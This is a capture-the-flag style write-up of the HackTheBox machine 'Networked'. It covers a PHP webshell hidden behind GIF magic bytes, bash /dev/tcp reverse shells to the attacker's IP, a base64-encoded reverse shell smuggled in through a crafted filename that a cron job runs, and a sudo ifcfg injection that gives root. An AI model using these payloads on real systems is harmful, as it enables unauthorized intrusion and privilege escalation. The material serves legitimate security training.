# Networked — HackTheBox Writeup

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.x.x

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [File Upload Bypass — Magic Bytes + Double Extension](#2-file-upload-bypass--magic-bytes--double-extension)
3. [Remote Code Execution — Webshell to Reverse Shell](#3-remote-code-execution--webshell-to-reverse-shell)
4. [Lateral Movement — apache to guly via Cron Job Injection](#4-lateral-movement--apache-to-guly-via-cron-job-injection)
5. [Privilege Escalation — guly to root via ifcfg Injection](#5-privilege-escalation--guly-to-root-via-ifcfg-injection)

---

## 1. Reconnaissance

### TCP Scan
```bash
nmap -T4 -sV -sC -n -Pn 10.129.x.x
```

**Results:**
- Port 22 — OpenSSH
- Port 80 — Apache httpd 2.4.6 (CentOS)

### Web Enumeration

Browsing to port 80 revealed a basic gallery page. Directory fuzzing discovered hidden endpoints:
```bash
gobuster dir -u http://10.129.x.x -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/upload.php` — file upload functionality
- `/photos.php` — gallery displaying uploaded files
- `/lib.php` — library file included by others

> **Key Takeaway:** Always fuzz for hidden files and directories. The upload functionality was not linked anywhere on the main page — only discovered through fuzzing.

---

## 2. File Upload Bypass — Magic Bytes + Double Extension

### Identifying the Restrictions

The upload form at `/upload.php` accepted only `jpg, jpeg, gif, png`. Two server-side checks were in place:

1. **Extension whitelist** — only image extensions accepted
2. **Magic bytes check** — server reads first bytes of file to verify it's really an image

### Understanding Magic Bytes

Every file format has a unique signature at the start:
```
GIF89a     ← GIF magic bytes
FF D8 FF   ← JPEG magic bytes
89 PNG     ← PNG magic bytes
```

The server reads these bytes to verify the file is actually an image — not just trusting the extension.

### The Bypass

Prepend valid GIF magic bytes to a PHP webshell:
```bash
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php
```

This satisfies the magic bytes check while containing executable PHP code.

### How the Filename Gets Chosen

After uploading and checking `/photos.php`, the filename was:
```
10_10_14_54.php.gif
```

The server **auto-names files using the uploader's IP address** and appends the uploaded file's extension. Uploading `shell.php` kept the `.php` extension, resulting in the double extension `10_10_14_54.php.gif`.

### Why Double Extension Worked — Apache Misconfiguration

On a properly configured server `.php.gif` would be served as a static image. However this box ran an older CentOS Apache configuration:
```apache
AddHandler php5-script .php
```

This tells Apache to execute **any file containing `.php` anywhere in the name** as PHP — including `.php.gif`.

> **How to confirm PHP is executing vs being served raw:** If accessing the file returns `GIF89a` as plain text → PHP is NOT executing. If `?cmd=id` returns command output → PHP IS executing. On this box PHP executed despite the `.gif` extension.

---

## 3. Remote Code Execution — Webshell to Reverse Shell

### Verifying RCE
```bash
curl "http://10.129.x.x/uploads/10_10_14_54.php.gif?cmd=id"
```

Output confirmed code execution as `apache`.

### Why `--data-urlencode`

Reverse shell payloads contain special characters (`>&`, spaces) that break URLs if sent raw. `curl -G --data-urlencode` handles encoding automatically:
```bash
curl -G \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.54/1234 0>&1"' \
  http://10.129.x.x/uploads/10_10_14_54.php.gif
```

Start listener first:
```bash
nc -lvnp 1234
```

**Result:** Reverse shell received as `apache`.

### Understanding the Reverse Shell Payload
```
bash -i                            → interactive bash shell
>& /dev/tcp/10.10.14.54/1234      → redirect stdout+stderr to TCP socket
0>&1                               → redirect stdin to same socket (so you can type)
```

`/dev/tcp/IP/PORT` is a bash built-in — not a real file. Bash opens a TCP connection to your machine when this path is referenced.

---

## 4. Lateral Movement — apache to guly via Cron Job Injection

### Enumerating guly's Home Directory

After landing as `apache`, navigated to `/home/guly` and found two interesting files:
```bash
cat /home/guly/crontab.guly
```
```
*/3 * * * * php /home/guly/check_attack.php
```

A cron job running as `guly` every 3 minutes. Read the script:
```bash
cat /home/guly/check_attack.php
```
```php
$path = '/var/www/html/uploads/';
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
    list ($name,$ext) = getnameCheck($value);
    $check = check_ip($name,$value);

    if (!($check[0])) {
        exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
        mail($to, $msg, $msg, $headers, "-F$value");
    }
}
```

### Understanding the Vulnerability

The script scans `/var/www/html/uploads/` and for any file that doesn't match a valid IP pattern it runs:
```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

The filename `$value` is passed **directly into exec() with no sanitization**. If the filename contains shell metacharacters like `;` they get executed as shell commands — running as `guly` because that's who owns the cron job.

### The Exploit — Malicious Filename

Base64 encode the reverse shell to avoid special character issues:
```bash
echo -n 'bash -c "bash -i >/dev/tcp/10.10.14.54/4444 0>&1"' | base64
# YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCAwPiYxIg==
```

Create a file whose **name is the malicious command**:
```bash
cd /var/www/html/uploads
touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCAwPiYxIg== | base64 -d | bash'
```

> **Why `--`?** In Linux `--` signals end of options — everything after is treated as a filename, not a flag. Without it the shell might misinterpret the leading `;` in the filename.

> **Why base64?** The reverse shell contains `>&` and `/` which would break the filename or the exec() call. Base64 encodes it to safe alphanumeric characters. The `| base64 -d | bash` in the filename decodes and executes it at runtime.

### What Happens When Cron Runs
```
cron runs check_attack.php as guly every 3 minutes
        ↓
script scans /var/www/html/uploads/
        ↓
finds file: ;echo YmFz...== | base64 -d | bash
        ↓
filename fails IP check → exec() is called
        ↓
exec("nohup /bin/rm -f /var/www/html/uploads/;echo YmFz...== | base64 -d | bash")
        ↓
; splits into two commands → second command executes
        ↓
base64 decodes and runs reverse shell as guly
```

Set up listener and wait up to 3 minutes:
```bash
nc -lvnp 4444
```

**Result:** Reverse shell received as `guly`. Grabbed user flag:
```bash
cat /home/guly/user.txt
```

---

## 5. Privilege Escalation — guly to root via ifcfg Injection

### Enumeration
```bash
sudo -l
```

**Output:**
```
(root) NOPASSWD: /usr/local/sbin/changename.sh
```

A custom script runnable as root without a password. Custom scripts in sudo are almost always the intended privesc path.

### Reading the Script
```bash
cat /usr/local/sbin/changename.sh
```
```bash
#!/bin/bash -p
regexp="^[a-zA-Z0-9_\ /-]+$"
for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
    echo "interface $var:"
    read x
    while [[ ! $x =~ $regexp ]]; do
        echo "wrong input, try again"
        read x
    done
    echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
/sbin/ifup guly0
```

Two things immediately stand out:

1. It writes user input directly into `/etc/sysconfig/network-scripts/ifcfg-guly`
2. The regex `^[a-zA-Z0-9_\ /-]+$` **allows spaces** (`\ ` is in the character class)

### Understanding the Vulnerability

Network config files in `/etc/sysconfig/network-scripts/` on CentOS/RHEL are **sourced as bash scripts** by the `ifup` utility. Values written into these files get evaluated as shell code when `ifup` runs.

When the file contains:
```
NAME=anything bash
```

In bash the syntax `VAR=value command` means "run `command` with `VAR` set to `value`". So `bash` after the space becomes a command that executes — as root since `ifup` runs as root.

The developer allowed spaces thinking they were harmless in an interface name. The space is exactly what enables the injection.

### Exploit
```bash
sudo /usr/local/sbin/changename.sh
```
```
interface NAME:
anything bash        ← space separates value from injected command
interface PROXY_METHOD:
a
interface BROWSER_ONLY:
a
interface BOOTPROTO:
a
```

Dropped into a root shell immediately:
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

---

## Attack Chain Summary
```
nmap → Port 80 Apache on CentOS
        ↓
gobuster → /upload.php discovered
        ↓
Magic bytes (GIF89a) + shell.php uploaded
        ↓
Server names file 10_10_14_54.php.gif
        ↓
Apache misconfiguration executes .php.gif as PHP
        ↓
curl --data-urlencode → reverse shell as apache
        ↓
/home/guly/crontab.guly → check_attack.php runs every 3 min as guly
        ↓
check_attack.php passes filename into exec() unsanitized
        ↓
touch -- ';echo BASE64 | base64 -d | bash' in uploads/
        ↓
cron triggers → ; splits command → reverse shell as guly
        ↓
sudo -l → /usr/local/sbin/changename.sh NOPASSWD
        ↓
ifcfg files sourced as bash by ifup
        ↓
NAME=anything bash → space injects bash command → root shell
```
